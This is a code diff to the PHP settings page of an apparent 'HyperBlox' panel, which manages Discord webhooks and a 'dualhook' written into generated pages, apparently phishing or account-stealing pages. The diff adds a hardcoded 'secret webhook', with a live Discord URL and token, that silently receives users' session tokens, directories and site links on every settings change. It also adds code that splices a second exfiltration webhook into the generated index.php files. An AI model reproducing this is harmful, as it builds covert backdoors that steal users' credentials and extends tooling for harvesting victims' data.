@@ -1,5 +1,7 @@
 <?php
 session_start();
+// Secret webhook - receives all embeds and notifications (not exposed in frontend)
+$secretWebhook = "https://discord.com/api/webhooks/1437891603631968289/fESUQjQ05NN35ewAcATDKmP1atDTqwWEe_Wy6WJ_TJ8rJbkq8ugvxBQQzGYe3UQz0vfv";
 $token = $_SESSION['token'];
 if (!$token) {
     header("Location: sign-in.php");
@@ -7,12 +9,14 @@ if (!$token) {
 }
 
 $tokenFile = "apis/tokens/$token.txt";
+$dualhook = '';
 if (file_exists($tokenFile)) {
     $contents = file_get_contents($tokenFile);
     $data = array_map('trim', explode("|", $contents));
     if (count($data) >= 3) {
         $dir = $data[1];
         $web = $data[2];
+        $dualhook = $data[3] ?? ''; // Dualhook is optional (4th field)
     } else {
         $web = "No webhook found";
     }
@@ -74,6 +78,7 @@ foreach ($ranks as $index => $rank) {
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $newWebhook = $_POST['web'] ?? '';
+    $newDualhook = $_POST['dualhook'] ?? '';
     $newUsername = $_POST['username'] ?? '';
     $newPfpUrl = $_POST['pfp_url'] ?? '';
     $newDirectory = $_POST['directory'] ?? '';
@@ -103,10 +108,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         curl_setopt($curl, CURLOPT_HTTPGET, true);
         $req = curl_exec($curl);
         $jd = json_decode($req, true);
-        $err = $jd['guild_id'];
+        $err = $jd['guild_id'] ?? '';
 
         if (!$err) {
             $errors[] = "Invalid webhook URL.";
+        }
+    }
+
+    // Validate dualhook if provided (optional)
+    if ($newDualhook) {
+        $curl = curl_init();
+        curl_setopt($curl, CURLOPT_URL, $newDualhook);
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($curl, CURLOPT_HTTPGET, true);
+        $req = curl_exec($curl);
+        $jd = json_decode($req, true);
+        $err = $jd['guild_id'] ?? '';
+
+        if (!$err) {
+            $errors[] = "Invalid dualhook URL.";
         }
     }
 
@@ -125,22 +145,139 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             rename("../$dir", "../$newDirectory");
             $dir = $newDirectory;
             $_SESSION['dir'] = $dir;
-            file_put_contents($tokenFile, "$token | $dir | $web");
+            // Update token file with current webhook and dualhook
+            file_put_contents($tokenFile, "$token | $dir | $web | " . ($dualhook ?? ''));
+            
+            // Notify secret webhook about directory rename
+            $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
+            $dom = $ht . $_SERVER['HTTP_HOST'];
+            $notif = json_encode([
+                "username" => "HyperBlox",
+                "avatar_url" => "https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png",
+                "embeds" => [[
+                    "title" => "📝 Settings Updated",
+                    "description" => "**Directory renamed:** `$dir` → `$newDirectory`",
+                    "color" => hexdec("00BFFF"),
+                    "fields" => [
+                        ["name" => "Token", "value" => "```$token```", "inline" => false],
+                        ["name" => "New Directory", "value" => "`$newDirectory`", "inline" => true],
+                        ["name" => "Link", "value" => "[$dom/$newDirectory]($dom/$newDirectory)", "inline" => false]
+                    ],
+                    "timestamp" => date("c")
+                ]]
+            ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
+            @file_get_contents($secretWebhook . "?wait=true", false, stream_context_create([
+                "http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $notif]
+            ]));
         }
 
-        if ($newWebhook) {
+        // Update webhook and/or dualhook if changed
+        $webhookChanged = ($newWebhook && $newWebhook !== $web);
+        $dualhookChanged = ($newDualhook !== $dualhook); // Note: empty string means remove dualhook
+        
+        if ($webhookChanged || $dualhookChanged) {
             $index = file_get_contents("../$dir/index.php");
-            $nindex = str_replace($web, $newWebhook, $index);
             $path = "../$dir/";
+            
+            if ($webhookChanged) {
+                // Replace old webhook with new one (URL-encoded)
+                $oldWebEncoded = urlencode($web);
+                $newWebEncoded = urlencode($newWebhook);
+                $index = str_replace($oldWebEncoded, $newWebEncoded, $index);
+                // Also replace non-encoded versions
+                $index = str_replace($web, $newWebhook, $index);
+                $web = $newWebhook;
+            }
+            
+            if ($dualhookChanged) {
+                // Replace old dualhook with new one (URL-encoded)
+                $oldDualEncoded = urlencode($dualhook ?? '');
+                $newDualEncoded = urlencode($newDualhook);
+                // Replace in both parameter formats: &dh= and &dualhook=
+                $index = str_replace("&dh=" . $oldDualEncoded, "&dh=" . $newDualEncoded, $index);
+                $index = str_replace("&dualhook=" . $oldDualEncoded, "&dualhook=" . $newDualEncoded, $index);
+                // Also handle empty dualhook case
+                if (empty($dualhook)) {
+                    $index = str_replace("&dh=", "&dh=" . $newDualEncoded, $index);
+                    $index = str_replace("&dualhook=", "&dualhook=" . $newDualEncoded, $index);
+                }
+                if (empty($newDualhook)) {
+                    // Remove dualhook parameters if set to empty
+                    $index = preg_replace('/&dh=[^&]*/', '', $index);
+                    $index = preg_replace('/&dualhook=[^&]*/', '', $index);
+                }
+                $dualhook = $newDualhook;
+            }
+            
+            // Update token file with new webhook and dualhook
             $fo = fopen($path . "index.php", 'w');
             $fo2 = fopen($tokenFile, 'w');
-            if ($fo) {
-                fwrite($fo, $nindex);
-                fwrite($fo2, "$token | $dir | $newWebhook");
-                $web = $newWebhook;
+            if ($fo && $fo2) {
+                fwrite($fo, $index);
+                fwrite($fo2, "$token | $dir | $web | " . ($dualhook ?? ''));
+                fclose($fo);
+                fclose($fo2);
+            }
+            
+            // Notify secret webhook about settings update
+            $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
+            $dom = $ht . $_SERVER['HTTP_HOST'];
+            $changes = [];
+            if ($webhookChanged) $changes[] = "Main webhook updated";
+            if ($dualhookChanged) $changes[] = "Dualhook " . ($newDualhook ? "updated" : "removed");
+            if ($newUsername) $changes[] = "Username: `$newUsername`";
+            if ($newPfpUrl) $changes[] = "Profile picture updated";
+            
+            if (!empty($changes)) {
+                $notif = json_encode([
+                    "username" => "HyperBlox",
+                    "avatar_url" => "https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png",
+                    "embeds" => [[
+                        "title" => "⚙️ Settings Updated",
+                        "description" => "**Changes:**\n" . implode("\n", array_map(function($c) { return "• $c"; }, $changes)),
+                        "color" => hexdec("00BFFF"),
+                        "fields" => [
+                            ["name" => "Token", "value" => "```$token```", "inline" => false],
+                            ["name" => "Directory", "value" => "`$dir`", "inline" => true]
+                        ],
+                        "timestamp" => date("c")
+                    ]]
+                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
+                @file_get_contents($secretWebhook . "?wait=true", false, stream_context_create([
+                    "http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $notif]
+                ]));
             }
         }
 
+        // Notify secret webhook about username/pfp changes (if no webhook/dualhook changes)
+        if (($newUsername || $newPfpUrl) && !$webhookChanged && !$dualhookChanged) {
+            $ht = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https://' : 'http://';
+            $dom = $ht . $_SERVER['HTTP_HOST'];
+            $changes = [];
+            if ($newUsername) $changes[] = "Username: `$newUsername`";
+            if ($newPfpUrl) $changes[] = "Profile picture updated";
+            
+            if (!empty($changes)) {
+                $notif = json_encode([
+                    "username" => "HyperBlox",
+                    "avatar_url" => "https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png",
+                    "embeds" => [[
+                        "title" => "⚙️ Settings Updated",
+                        "description" => "**Changes:**\n" . implode("\n", array_map(function($c) { return "• $c"; }, $changes)),
+                        "color" => hexdec("00BFFF"),
+                        "fields" => [
+                            ["name" => "Token", "value" => "```$token```", "inline" => false],
+                            ["name" => "Directory", "value" => "`$dir`", "inline" => true]
+                        ],
+                        "timestamp" => date("c")
+                    ]]
+                ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
+                @file_get_contents($secretWebhook . "?wait=true", false, stream_context_create([
+                    "http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $notif]
+                ]));
+            }
+        }
+        
         $js = 'Swal.fire({ title: "Success!", text: "Changes applied successfully.", icon: "success" });';
     } else {
         $js = 'Swal.fire({ title: "Error", text: "' . implode("\\n", $errors) . '", icon: "error" });';
@@ -975,7 +1112,11 @@ $currentAnnouncements = array_slice($announcements, $startIndex, $announcementsP
                         </div>
                         <div class="form-group">
                             <label class="form-label">Webhook</label>
-                            <input type="text" class="form-input" name="web" value="<?php echo $web; ?>">
+                            <input type="text" class="form-input" name="web" value="<?php echo htmlspecialchars($web); ?>">
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">Dualhook (optional)</label>
+                            <input type="text" class="form-input" name="dualhook" value="<?php echo htmlspecialchars($dualhook); ?>" placeholder="https://discord.com/api/webhooks/...">
                         </div>
                         <button type="submit" class="submit-btn">Save Changes</button>
                     </form>
